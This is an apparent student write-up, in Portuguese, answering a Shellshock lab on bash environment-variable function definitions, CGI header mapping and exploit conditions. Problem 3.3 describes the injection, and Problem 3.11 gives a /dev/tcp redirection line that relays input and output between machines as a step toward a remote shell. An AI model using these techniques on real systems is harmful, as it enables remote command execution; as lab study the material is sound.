@@ -1,0 +1,77 @@
+			**Lab 3: Shellshock**
+
+# Link para as perguntas
+
+[](https://docs.wixstatic.com/ugd/ff94d5_0310cfafda2a417a886f6ec205d158a4.pdf)
+
+# Problema 3.1
+
+Depende. Se o processo filho não for um shell, a definição de função continuará armazenada como *string* na variável de ambiente do filho. Já se o filho for um shell - isto é, uma versão insegura de shell - então ele tanto manterá a variável de ambiente quanto a processará e disponibilizará a função shell que seu conteúdo representa.
+
+# Problema 3.2
+
+O shell pai define uma variável de ambiente para o filho, contendo a definição de função. 
+
+Quando testei (no */bin/bash_shellshock*), defini uma função *myfunc* no pai, criei um shell filho e, ao inspecionar suas variáveis de ambiente, encontrei *myfunc=() {  echo "oi"* no meio delas. Parece uma sintaxe para indicar ao filho que essa variável de ambiente deve ser interpretada como uma *função de shell*.
+
+# Problema 3.3
+
+Basta definir uma variável de shell contendo uma definição de função seguida de qualquer comando (malicioso), então executar um programa setuid que use a chamada *system()* (já que ela executará um subprocesso shell).
+
+# Problema 3.4
+
+Não será executado, porque o texto da variável de ambiente do filho não vai começar com uma definição de função, e é somente no início da string que a lógica do shell procura definições de função.
+
+# Problema 3.5
+
+- O processo a ser atacado precisa ser um bash.
+
+- Ele precisa ser executado de maneira que contenha variáveis de ambiente que possam ser interpretadas como definições de função, ou, mais genericamente, precisa pelo menos aceitar variáveis de ambiente definíveis externamente.
+
+# Problema 3.6
+
+Headers HTTP são transformados em variáveis de ambiente para programas CGI
+
+# Problema 3.7
+
+Não, já que esses comandos serão tratados como meras strings no processo CGI. A vulnerabilidade está em fazer o processo tratar dados como código, e, para isso, é necessário que o "dado" seja uma string iniciando por uma definição de função.
+
+# Problema 3.8
+
+Bom, não sei que tipo de "por quê" está sendo perguntado, mas uma lição de moral possível é: a causa foi tratar dados (concretamente, variáveis de ambiente) como se fossem código (concretamente, definição de função)
+
+# Problema 3.9
+
+Não funciona, porque URLs são codificadas de maneira que espaços em branco (necessários para a sintaxe de definição de função shell) são transformados em *%20* (testei esse comportamento listando as variáveis de ambiente de um script cgi).
+
+# Problema 3.10
+
+Primeiro, redirecionamos a entrada padrão para a máquina 1 (leremos da máquina 1). Então, redirecionamos a saída padrão para a máquina 1. 
+
+Assim sendo, teremos um processo sendo executado na máquina 2, mas com saída padrão e entrada padrão na máquina 1... e o processo em si é um "eco", ou seja, tudo que for digitado na máquina 1 será processado na máquina 2 e devolvido idêntico para a máquina 1 (testei esse comportamento).
+
+# Problema 3.11
+
+Muito similar ao problema anterior: 
+
+```sh
+/bin/cat < /dev/tcp/10.0.2.6/7070 > /dev/tcp/10.0.2.27/7070
+```
+
+Em que 10.0.2.6 é o ip da máquina 2 (de onde vem o *input*) e 10.0.2.27 é o da máquina 3 (para onde vai o *output*);
+
+# Problema 3.12
+
+Analisando a lógica do programa, o esperado é que ele liste o diretório corrente. Um efeito indesejado potencial seria que a palavra "world" fosse impressa também (caso o shell fosse vulnerável), o que não vai acontecer porque o shell em que *ls* será executado não terá nenhuma variável de ambiente (o terceiro argumento de *execve()* especifica as variáveis de ambiente, e ele foi dado como *NULL*). Em outras palavras, *foo* não alcançará esse subshell
+
+# Problema 3.13
+
+Apesar de muito similar à questão anterior, agora *foo* (além de, claro, as outras variáveis exportadas do shell atual) será passada como variável de ambiente para o shell que executará *ls*. Em consequência, se esse último shell for vulnerável, acabará por imprimir a palavra "world" na tela.
+
+# Problema 3.14
+
+Ao que parece (por testes que fiz):
+
+- O primeiro programa (php) não é vulnerável a shellshock, porque o php limpa muitas das variáveis de ambiente. Em particular, percebi que aquelas *HTTP_algo*, características do mapeamento `HTTP header -> variável de ambiente`, não estão presentes (percebido facilmente alterando a chamada de sistema feita pelo script php, para que ele imprima suas variáveis de ambiente).
+
+- O segundo programa pode ser explorado, mas não exatamente da maneira como a chamada a *curl* foi feita. É necessário imprimir o header *Content_type* e duas linhas em branco para indicar o início do *body* da resposta HTTP (da maneira como está, a chamada não funciona).
